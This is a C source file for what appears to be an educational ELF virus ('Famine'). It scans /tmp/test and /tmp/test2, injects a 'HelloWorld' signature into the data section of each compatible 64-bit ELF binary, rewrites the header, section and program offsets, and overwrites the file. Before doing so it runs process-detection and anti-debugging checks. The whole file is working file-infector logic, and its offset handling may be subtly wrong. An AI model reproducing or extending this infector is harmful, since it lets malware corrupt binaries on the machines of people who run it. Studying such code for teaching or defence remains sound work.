#include "famine.h"
const char *payload = "HelloWorld";

static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
    size_t      i;
    Elf64_Shdr  *section;
    Elf64_Phdr  *program;

    if (header->e_entry > offset)
      header->e_entry += toAdd;
    if (header->e_phoff > offset)
      header->e_phoff += toAdd;
    if (header->e_shoff > offset)
      header->e_shoff += toAdd;
    i = 0;
    while (i < header->e_shnum) {
        section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
        if (section->sh_offset > offset)
            section->sh_offset += toAdd;
        i += 1;
    }
    i = 0;
    while (i < header->e_phnum) {
        program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
        if (program->p_offset > offset)
            program->p_offset += toAdd;
        if (program->p_paddr > offset)
            program->p_paddr += toAdd;
        i += 1;
    }
}

static int  infectFile(const char *dirname, struct dirent *file) {
  Elf64_Shdr    *data;
  struct bfile  header;
  size_t        offset;

  if (mapFile(dirname, file->d_name, &header) == -1)
    return (0);
  if ((size_t)(header.size) < sizeof(Elf64_Ehdr) || !isCompatible(header.header->e_ident, header.header->e_machine))
    return (0);
  data = getDataSectionHeader(header.header);
  data->sh_size += strlen(payload) + 1;
  offset = data->sh_offset;
  appendSignature(header, offset + data->sh_size - strlen(payload) - 1);
  header.size += strlen(payload) + 1;
  updateOffsets(header.header, offset, strlen(payload) + 1);
  writeToFile(dirname, file->d_name, header);
  return (0);
}

static int  infectBins(const char *dirname) {
  DIR *dir;
  struct dirent *file;

  if ((dir = opendir(dirname)) == NULL)
    return (-1);
  while ((file = readdir(dir)) != NULL) {
    if (infectFile(dirname, file) == -1) {
      closedir(dir);
      return (-1);
    }
  }
  closedir(dir);
  return (0);
}

int   main(void) {
  size_t  i;
  char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};

  if (checkProcess() != 0)
    return (1);
  if (preventDebug() == -1)
    return (1);
  i = 0;
  while (infectDir[i] != NULL) {
    if (infectBins(infectDir[i]) == -1)
      return (1);
    i += 1;
  }
  return (0);
}
